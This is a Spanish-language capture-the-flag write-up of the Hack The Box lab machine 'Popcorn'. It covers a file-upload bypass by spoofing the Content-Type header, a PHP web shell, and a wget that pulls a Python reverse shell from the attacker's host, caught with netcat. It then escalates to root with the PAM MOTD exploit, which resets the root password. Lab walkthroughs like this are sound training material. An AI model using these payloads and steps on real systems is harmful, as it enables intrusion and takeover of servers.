# Popcorn

<p align="center">
  <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/popcorn.png">
</p>


## Resumen

Popcorn es una máquina Linux creada por el usuario [Ch4t1](https://www.hackthebox.eu/home/users/profile/1), lanzada el 15 de marzo de 2017. El nivel de seguridad es Medium, pero, en las estadísticas, la mayoría de usuarios la califican como Fácil. En la fase de reconocimiento, se identifica los puertos 21 y 80 abiertos, en donde el puerto 80 tiene configurado apache, luego en la etapa de reconocimiento web, se identificó una aplicación de nombre Torrnet Hoster, que es vulnerable a File Upload. En la fase de explotación se modficaron las cabeceras HTTP para realizar un tampering del archivo a subir (PHP), y finalmente se logró escalar privilegios explotando una vulnerabilidad del sistema basada en PAM MOTD. 

<p align="center"> <img height="400" src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/info.png"></p>

## Reconocimiento

### Identificación de puertos

En el escaneo de puertos, se identifica únicamento abiertos los puertos 22, y 80.


<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image.png"></p>

### Reconocimiento web

Al ingresar a la url http://10.10.10.6, aparece que el sitio web está configurado con Apache.

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image1.png"></p>

Realizando una búsqueda con gobuster, podemos encotrar archivos y carpetas interesantes:

```markdown
$gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  -o gobustesr-pop.txt
```
El resultado que se obtiene de gobuster, es una serie de carpetas, entre ellas una de nombre torrent
```markdown
$ cat gobustesr-pop.txt
/index (Status: 200)
/test (Status: 200)
/torrent (Status: 301)
/rename (Status: 301)
```
Al acceder a la carpeta /torrent se encuentra una página de Torrent Hoster, donde luego de registrase, se ingresa a la página y se tiene acceso para subir archivos .torrent. A continuación se deberá buscar la manera de subir un .php.

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image2.png"></p>


### Identificación de Vulnerabilidades

#### Searchsploit

Usando la herramienta searchsploit desde kali linux, encuentramos un exploit para torrent host.

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image3.png"></p>

El exploit encontrado, hace referencia a una vulnerabilidad que permite subir archivos al servidor, tales como una shell en php.

Abrimos el navegador, y desde la url antes mencionada http://10.10.10.6/torrent,  nos ubicamos en la opción "uploads de Torrent" y notamos que nos deja subir únicamente los archivos con extensión .torrent. También notamos que, al momento de subir los torrents, existen varias categorías, entre ellas pictures (se deberá verificar si es posible subir imágenes). 

Una vez que se sube el .torrent, se crea un enlace hacia el torrent.

```markdown
http://10.10.10.6/torrent/torrents.php?mode=details&id=12627cf538d2c6a9268e7eb41e30cba06822007b
```
En la pestaña de Browse, podemos ver nuestro torrent que acabamos de subir, y dando clic sobre el mismo, se abre una ventana con la descripción, y notamos algo importante: que es posible editar el torrent:

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image4.png"></p>


El enlace para modificar el torrent es el siguiente:

```markdown
10.10.10.6/torrent/edit.php?mode=edit&id=12627cf538d2c6a9268e7eb41e30cba06822007b 
```

Al subir una imagen aparece el siguiente mensaje:

<img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image5.png">

El siguiente paso es buscar el directorio donde se suben las imágenes.
<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image6.png"></p>

Dando clic derecho (Open link in New Tab) en la imagen, se puede acceder al directorio donde está almacenda la imagen:
```markdown
http://10.10.10.6/torrent/upload/12627cf538d2c6a9268e7eb41e30cba06822007b.jpg
```
La imagen está guardada como  12627cf538d2c6a9268e7eb41e30cba06822007b.jpg y el directio de almacenamiento es http://10.10.10.6/torrent/upload/ 

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image7.png"></p>

#### Burp Suite

Con Burp suite analizamos los headers de peticiones POST que se hacen al servidor de popcorn. 

Proxy > Options > Intercept Client Requests, y marcamos Or HTTP method y And URL (Is in target scope).

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image8.png"></p>

Al observar el header, aparece el tipo de extensión multipropósito de Internet [MIME](https://developer.mozilla.org/es/docs/Web/HTTP/Basics_of_HTTP/MIME_types) Content-Type: image/png, que representa cualquier tipo de imagen.

```markdown
-----------------------------12126752011066893049927503816
Content-Disposition: form-data; name="file"; filename="iSeg.PNG"
Content-Type: image/png

 PNG
#
```

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image9.png"></p>


#### Analizando el Requests

Al tratar de subir un archivo PHP que contiene código para una shell reversa, aparece el header con el Content-Type x-php, y este tipo de content, tiene restricción de subida al servidor. En el request verifica que los archivos que se suben sean de tipo imágenes.


```markdown
POST /torrent/upload_file.php?mode=upload&id=12627cf538d2c6a9268e7eb41e30cba06822007b HTTP/1.1
Host: 10.10.10.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.6/torrent/edit.php?mode=edit&id=12627cf538d2c6a9268e7eb41e30cba06822007b
Content-Type: multipart/form-data; boundary=---------------------------19478517611571700031408018571
Content-Length: 415
Connection: close
Cookie: /torrent/=; /torrent/torrents.php=openfiles|; /torrent/login.php=; /torrent/index.php=; saveit_0=5; saveit_1=0; /torrent/torrents.phpfirsttimeload=0; PHPSESSID=a00968fb6723b4040c1104045129d3e3
Upgrade-Insecure-Requests: 1

-----------------------------19478517611571700031408018571
Content-Disposition: form-data; name="file"; filename="bind.php"
Content-Type: application/x-php

<?php echo system($_REQUEST['iseg']); ?>

-----------------------------19478517611571700031408018571
Content-Disposition: form-data; name="submit"

Submit Screenshot
-----------------------------19478517611571700031408018571--
```

#### Analizando el Response

Usando Burp Suite, desde la pestaña Repeater enviamos un Send y la Response da el error de Ivalid file:

```markdown
HTTP/1.1 200 OK
Date: Thu, 02 Apr 2020 17:20:15 GMT
Server: Apache/2.2.12 (Ubuntu)
X-Powered-By: PHP/5.2.10-2ubuntu6.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: private
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 12
Connection: close
Content-Type: text/html

Invalid file
```

#### Modificando los Headers - Content-Type

Con solo cambiar el valor de Content-Type: application/x-php por Content-Type: image/png, se puede subir un archivo .php. 

A continuación, se muestra el código PHP que se añade al final para la ejecucioin de comandos. También le damos un nombre en filename = cmd.png.php.

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image10.png"></p>


#### Subiendo la shell PHP

Usando Burp Suite, desde la pestaña Repeater, modificamos en el header el tipo de contenido por PHP, y damos clic Send. Si la subida fue correcta, debe salir el siguiente mensaje en la respuesta:

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image11.png"></p>

Verificamos desde el navegador si en la carpeta de uploads está nuestra shell PHP:

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image12.png"></p>

El archivo marcado en rojo, es el php que subimos mediante burpsuite, y será desde donde se pasen los parámetros por medio de la variable iseg (?iseg=comandoLinux).

### Ejecución de comandos remotos

Con el php en el servidor, vamos a ejecutar comandos remotos que nos permita realizar consultas directas. 

<img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image13.png">

Haciendo un ls a la carpeta home, se ve la existencia de un usuario george. Con el comando cat al archivo el user.txt, se puede ver la bandera.

```markdown
5e36***********************f136
```
## Escalación de Privilegios

### Reverse Shell con python

Para mayor facilidad, vamos usar una shell reversa. En python-pty-shells1, existe una colección de shell reversas y binds. 

```markdown
$ git clone https://github.com/infodox/python-pty-shells.git
Cloning into 'python-pty-shells'...
remote: Enumerating objects: 55, done.
remote: Total 55 (delta 0), reused 0 (delta 0), pack-reused 55
```

La shell reversa a usar es tcp_pty_backconnect.py, en la que se debe cambiar los valores lhost y lport, según los datos de nuestro equipo local.

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image15.png"></p>

### Módulo SimpleHTTPServer de python

En la ubicación en donde se guardó la shell reversa (tcp_backconnect.py) iniciamos el módulo de python SimpleHTTPServer con permisos de superusuario:
```markdown
# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 …
```
Abrir BurpSuite o usadndo el navegador para asignar el comando wget a la variable del php que subió en el paso anterior:

```markdown
http://10.10.10.6/torrent/upload/12627cf538d2c6a9268e7eb41e30cba06822007b.php?iseg=wget%20http://10.10.14.15:8000/tcp_pty_backconnect.py
```
En la respuesta de SimpleHTTPServer vemos un OK

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image15.png"></p>

Desde el navegador comprobar que se subió el archivo tcp_pty_backconnect.py
```markdown
http://10.10.10.6/torrent/upload/
```
<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image16.png"></p>

Nota: se puede subir directamente el fichero a la carpeta /dev/shm/.shell.py como archivo oculto. Shm viene de Shared Memory y es una porción de memoria, estrictamente de uso interno por el sistema operativo. aquí, se almacenan segmentos de memoria y datos temporales de varios dispositivos y aplicaciones que se comunican con el kernel. Los datos almacenados ahí desaparecen al reiniciar el sistema operativo.


```markdown
$ wget http://10.10.14.15:8000/tcp_pty_backconnect.py -O /dev/shm/.shell.py
```

###  Conexión remota

Desde una terminal local, iniciar netcat a la escucha en el puerto 8000

```
$ nc -nlvp 8000
```
En el navegador o con burpsuite ejecutamos el comando: 
```
python tcp_pty_backconnect.py
```
En nuestro caso, envíamos el comando desde nuestro script de php:

```
http://10.10.10.6/torrent/upload/12627cf538d2c6a9268e7eb41e30cba06822007b.php?iseg=python%20tcp_pty_backconnect.py
```
Regresamos a la terminal en donde se ejecutó nc a la escucha en el puerto 8000:

```
$ nc -nlvp 8000
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.10.10.6.
Ncat: Connection from 10.10.10.6:33744.

www-data@popcorn:/var/www/torrent/upload$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@popcorn:/var/www/torrent/upload$    
```

## EXPLOTACIÓN

### Identificación de versiones del sistema

En el servidor buscamos versiones de aplicaciones, y el kernel para poder identificar posibles vulnerabilidades.

```
$ uname -ar
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```
Archivo version
```
$ cat /proc/version
cat /proc/version
Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009
```
Según la información obtenida con uname y en el archivo versión, podemos determoinar que el sistema operativo es un Ubuntu con kernel 2.6.31-14.

### Búsqueda de exploits para el kernel

Buscamos algún exploit para el kernel 2.6.31

searchexploit 

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image17.png"></p>

ubicación de los exploits

```
/usr/share/exploitdb/exploits/linux/local/33321.c
/usr/share/exploitdb/exploits/linux/local/40812.c
```
Descargamos el exploit 40812.c desde el servidor:

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image18.png"></p>

### Búsqueda de exploits para motd

<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image20.png"></p>

```
Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2)          | exploits/linux/local/14339.sh 
```
Se encontró el exploit Ubuntu PAM [MOTD](https://github.com/1N3/PrivEsc/blob/master/linux/linux_exploits/14339.sh) que funciona en sistemas Ubuntu. Este exploit apareció en el 2010 y prácticamente setea la contraseña del root por una predifinida dentro del script.

Copiamos el exploit a la carpeta local
```
# cp /usr/share/exploitdb/exploits/linux/local/14339.sh .
```
Con el siguiente comando se copia el contenido del exploit 14339 al clipboard, con el fin de crear un archivo en el servidor remoto y pasar el contenido directamente a dicho archivo. Por algún motivo, cuando se sube el exploit por wget, no ejecutaba, y sale error de sintaxis en la línea 39. usando xclip se ejecuta sin problema.

```
# cat 14339.sh | xclip
```

En el servidor remoto, se copia el contenido de xclip. El resultado del exploit es un script que setea la clave de root como toor.

```
$ vi privesc.sh
```
<p align="center"> <img src="https://raw.githubusercontent.com/iS3g/boxes/master/images/popcorn/image21.png"></p>

### Ejecutando el exploit


Finalmente se ejecuta el exploit que debe tener permisos de ejecución, y se ejecuta el comando bash privesc.sh:
```
www-data@popcorn:/dev/shm$ chmod +x privesc.sh
chmod +x privesc.sh
```

Con el comando bash, ejecutamos el script que servirá para escalar privilegios de root:

```
www-data@popcorn:/dev/shm$ bash privesc.sh
bash privesc.sh
privesc.sh: line 2: it: command not found
[*] Ubuntu PAM MOTD local root
[*] SSH key set up
[*] spawn ssh
[+] owned: /etc/passwd
[*] spawn ssh
[+] owned: /etc/shadow
[*] SSH key removed
[+] Success! Use password toor to get root
Password: toor

root@popcorn:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
```

Copiar el contenido del archivo root.txt ubicado en la carpeta root:

```
root@popcorn:/dev/shm# cd  
root@popcorn:~# ls
root.txt
root@popcorn:~# cat root.txt
f122*******************d9b14
```

Otro exploit que funciona, es el [15704.c](https://www.exploit-db.com/exploits/15704) (CVE-2010-4258) publicado en  2010, y el exploit [pokemon](https://github.com/FireFart/dirtycow/blob/master/dirty.c) que explota la vulnerabilidad dyrticow. En dirtycow.ninja se encuentran PoC sobre la escalación de privilegios explotando el kernel de Linux.


Tutorial realizado por [iS3g](https://www.hackthebox.eu/home/users/profile/262959)
---
<div style="text-align:center">    
  <a href="https://is3g.github.io/boxes/">Regresar</a>
  <!-- more links here -->
</div>
